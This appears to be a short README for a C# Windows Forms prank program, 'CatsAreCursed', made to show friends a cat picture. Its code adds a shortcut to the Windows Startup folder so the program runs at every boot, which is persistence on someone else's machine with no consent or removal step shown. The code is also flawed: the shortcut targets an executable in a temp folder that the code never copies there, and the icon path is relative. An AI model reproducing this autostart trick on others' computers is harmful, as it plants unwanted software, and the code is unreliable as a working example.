# CatsAreCursed

I did it bc i was kinda bored and wanted to have some fun with friends
anyway heres the code for program.cs

using IWshRuntimeLibrary;

namespace catsarecursed
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            ApplicationConfiguration.Initialize();
            Application.Run(new catsarecursed());

            CreateShortcut();
        }

        private static void CreateShortcut()
        {
            string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string TempFolder = Path.GetTempPath();

            Directory.CreateDirectory(TempFolder + "\\CatsAreCursed");

            WshShell shell = new WshShell();
            string shortcutAddress2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Start Menu", "Programs", "Startup" + @"\Cars.lnk");
            IWshShortcut shortcut2 = (IWshShortcut)shell.CreateShortcut(shortcutAddress2);
            shortcut2.TargetPath = Path.GetTempPath() + @"\CatsAreCursed\catsarecursed.exe";
            shortcut2.IconLocation = @"./CatsAreCursed/pic.jpg";
            shortcut2.Save();
        }
    }
}

It opens a picture of a cat, thats all
And it creates a shortcut and puts it in the autostart so that picture shows everytime windows boots up

Used:
.NET 6.0
Windows Forms
